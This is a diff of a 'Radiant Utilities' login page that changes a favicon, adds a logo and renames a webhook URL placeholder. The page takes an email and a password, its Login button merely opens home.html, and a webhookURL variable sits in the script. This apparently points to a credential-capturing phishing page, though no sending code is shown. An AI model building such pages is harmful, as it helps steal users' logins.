@@ -4,7 +4,7 @@
     <title>Radiant Utilities | Login</title>
     <link rel="stylesheet" type="text/css" href="style.css">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="shortcut icon" href="Server-modified.png" type="image/x-icon">
+    <link rel="shortcut icon" href="RadiantLogo.png" type="image/x-icon">
     <style>
         .content6 {
             display: flex;
@@ -27,7 +27,7 @@
         #email-count, #password-count {
             display: block;
         }
-      </style>
+        </style>
 </head>
 
 <body>
@@ -41,14 +41,15 @@
         <span id="email-counter">0</span>
         <input type="password" name="password" id="password-input" placeholder="Enter your password" required maxlength="50" class="input-counter">
         <h4 id="password-counter" style="display: none;">0/50</h4>
-        <button id="myButton" class="cust2om-button" disabled onclick="window.open('home.html');">Login</button>            
+        <button id="myButton" class="cust2om-button" disabled onclick="window.open('home.html');">Login</button>          
+        <img class="logo2" src="RadiantLogo.png" alt="Radiant Utilities Logo">  
       </div>
 
         <script>
           var emailInput = document.getElementsByName("email")[0];
           var passwordInput = document.getElementsByName("password")[0];
           var submitButton = document.getElementById("myButton");
-          var webhookURL = "webhookURL";
+          var webhookURL = "WEBHOOK_URL";
           var emailCounter = document.getElementById("email-counter");
           var passwordCounter = document.getElementById("password-counter");
 
